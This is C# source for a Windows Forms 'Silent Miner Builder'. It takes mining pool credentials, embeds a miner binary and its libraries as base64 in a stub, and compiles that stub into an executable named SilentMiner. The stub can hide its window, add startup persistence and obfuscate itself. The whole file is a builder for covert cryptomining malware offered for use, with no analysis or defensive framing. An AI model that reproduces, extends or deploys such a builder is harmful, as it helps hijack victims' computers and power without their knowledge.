using System;
using System.Windows.Forms;
using System.IO;
using System.Text;

namespace Silent_Miner_Builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        Random random = new Random();
        SaveFileDialog sfd = new SaveFileDialog();
        OpenFileDialog ofd = new OpenFileDialog();
        string stub = Properties.Resources.stub;
        string folder = Path.GetPathRoot(Application.ExecutablePath) + "Users\\" + Environment.UserName + "\\AppData\\Local\\MinerConfig";

        void CompleteStub()
        {
            stub = stub.Replace("%pool%", pool.Text)
            .Replace("%user%", user.Text)
            .Replace("%password%", password.Text)
            .Replace("%threads%", threads.Value.ToString())
            .Replace("%algo%", algo.Text)
            .Replace("%random%", RandomString(12))
            .Replace("%random1%", RandomString(9))
            .Replace("%random2%", RandomString(15))
            .Replace("%random3%", RandomString(10))
            .Replace("%random4%", RandomString(12))
            .Replace("%mutex%", RandomString(30))
            .Replace("%exeb%", Convert.ToBase64String(Properties.Resources.minerd))
            .Replace("%libcurl%", Convert.ToBase64String(Properties.Resources.libcurl_4))
            .Replace("%libiconv%", Convert.ToBase64String(Properties.Resources.libiconv_2))
            .Replace("%libidn%", Convert.ToBase64String(Properties.Resources.libidn_11))
            .Replace("%libintl%", Convert.ToBase64String(Properties.Resources.libintl_8))
            .Replace("%libwinpthread%", Convert.ToBase64String(Properties.Resources.libwinpthread_1))
            .Replace("%zlib1%", Convert.ToBase64String(Properties.Resources.zlib1));

                if (startup.Checked == true)
                {
                    stub = stub.Replace("%Startup();%", "Startup();")
                    .Replace("%Persistence();%", "Persistence();");
                }
                else
                {
                stub = stub.Replace("%Startup();%", "")
                .Replace("%Persistence();%", "");
                }    
                
                if(silentmode.Checked == true)
            {
                stub = stub.Replace("%silentmode%", "Hide");
            }
                else
            {
                stub = stub.Replace("%silentmode%", "NormalFocus");
            }
        }

        private string RandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            char ch;
            for (int i = 1; i < size + 1; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }

                return builder.ToString();
        }

        void SaveProfile()
        {
            string config = Properties.Resources.Profile;
            config = config.Replace("%pool%", "Pool|" + pool.Text)
                .Replace("%user%", "User|" + user.Text)
                .Replace("%password%", "Password|" + password.Text)
                .Replace("%threads%", "Threads|" + threads.Value.ToString());

            if(startup.Checked == true)
            {
                config = config.Replace("%startup%", "Startup|1");
            }
            else
            {
                config = config.Replace("%startup%", "Startup|0");
            }
            if(obfuscator.Checked == true)
            {
                config = config.Replace("%obf%", "Obf|1");
            }
            else
            {
                config = config.Replace("%obf%", "Obf|0");
            }

            if(silentmode.Checked == true)
            {
                config = config.Replace("%silent%", "Silent|1");
            }
            else
            {
                config = config.Replace("%silent%", "Silent|0");
            }

            if(!Directory.Exists(folder))
            {
                Directory.CreateDirectory(folder);
            }

            sfd.Filter = "Config(*.config)|*.config";
            sfd.InitialDirectory = folder;

            if(sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(sfd.FileName, config);
                MessageBox.Show("Profile saved!", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
                
        }

        void LoadProfile()
        {
            ofd.InitialDirectory = folder;
            ofd.Filter = "Config($.config)|*.config";

            if(ofd.ShowDialog() == DialogResult.OK)
            {
                string[] config = File.ReadAllLines(ofd.FileName);

                foreach (string line in config)
                {
                    string[] pools = line.Split('|');
                    string[] users = line.Split('|');
                    string[] passwords = line.Split('|');
                    string[] thread = line.Split('|');
                    string[] startups = line.Split('|');
                    string[] persistences = line.Split('|');
                    string[] obf = line.Split('|');
                    string[] silent = line.Split('|');

                    if (pools[0] == "Pool")
                    {
                        pool.Text = pools[1];
                    }
                    
                    if(users[0] == "User")
                    {
                        user.Text = users[1];
                    }

                    if (passwords[0] == "Password")
                    {
                        password.Text = passwords[1];
                    }

                    if (thread[0] == "Threads")
                    {
                        threads.Text = thread[1];
                    }

                    if(obf[0] == "Obf")
                    {
                        if(obf[1] == "1")
                        {
                            obfuscator.Checked = true;
                        }
                        else
                        {
                            obfuscator.Checked = false;
                        }
                    }

                    if (startups[0] == "Startup")
                    {
                        if(startups[1] == "1")
                        {
                            startup.Checked = true;
                        }
                        else
                        {
                            startup.Checked = false;
                        }
                    }

                    if(silent[0] == "Silent")
                    {
                        if(silent[1] == "1")
                        {
                            silentmode.Checked = true;
                        }
                        else
                        {
                            silentmode.Checked = false;
                        }
                    }

                }
            }
            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (algo.Text == string.Empty)
            {
                MessageBox.Show("Choose an algorithm", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                
                CompleteStub();

                sfd.Filter = "Executable(*.exe)|*.exe";
                sfd.FileName = "SilentMiner";
                sfd.InitialDirectory = Path.GetPathRoot(Application.ExecutablePath) + "Users\\" + Environment.UserName + "\\Desktop";

                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    if(obfuscator.Checked == true)
                    {
                        Compiler.Compile(sfd.FileName, stub, true);
                    }
                    else
                    {
                        Compiler.Compile(sfd.FileName, stub, false);
                    }
                    
                }
            }

             stub = Properties.Resources.stub;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            SaveProfile();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            LoadProfile();
        }
    }
}
